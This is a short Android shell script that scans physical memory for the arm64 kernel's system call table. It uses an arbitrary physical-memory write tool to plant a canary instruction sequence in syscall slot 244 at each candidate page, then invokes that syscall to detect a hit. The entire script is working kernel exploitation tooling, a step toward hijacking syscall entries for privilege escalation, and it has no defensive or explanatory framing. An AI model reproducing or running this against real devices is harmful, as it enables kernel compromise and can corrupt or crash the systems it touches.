#!/system/bin/sh
# SPDX-License-Identifier: MIT
# Scan for sys_call_table[244] physical address.
# Canary = movz x0,#0x1234 ; ret = d65f03c0d2824680 (little endian bytes: 80 46 82 d2 c0 03 5f d6)
# gaw64 writes 128 bytes at the given phys; kfunc_new call 244 returns the canary value.
GAW=/data/local/tmp/gaw64
KF=/data/local/tmp/kfunc_new
# canary as 64-bit value (already byte-swapped by encode_value in gaw64)
CAN=0xd65f03c0d2824680
start=$1
end=$2
c=$start
while [ $((c)) -le $((end)) ]; do
  # slot 244 = table_base + 0x7a0 ; write canary through EXT phys
  target=$((c + 0x7a0))
  $GAW $(printf '0x%x' $target) $CAN >/dev/null 2>&1
  r=$($KF call 244 2>/dev/null | sed -n 's/.*ret=0x//p')
  if [ "$r" = "1234" ]; then
    echo "HIT SLOT_PHYS table=$(printf '0x%x' $c) slot=$(printf '0x%x' $target)"
    exit 0
  fi
  c=$((c + 0x1000))
done
echo "NOT FOUND in $(printf '0x%x' $start)..$(printf '0x%x' $end)"
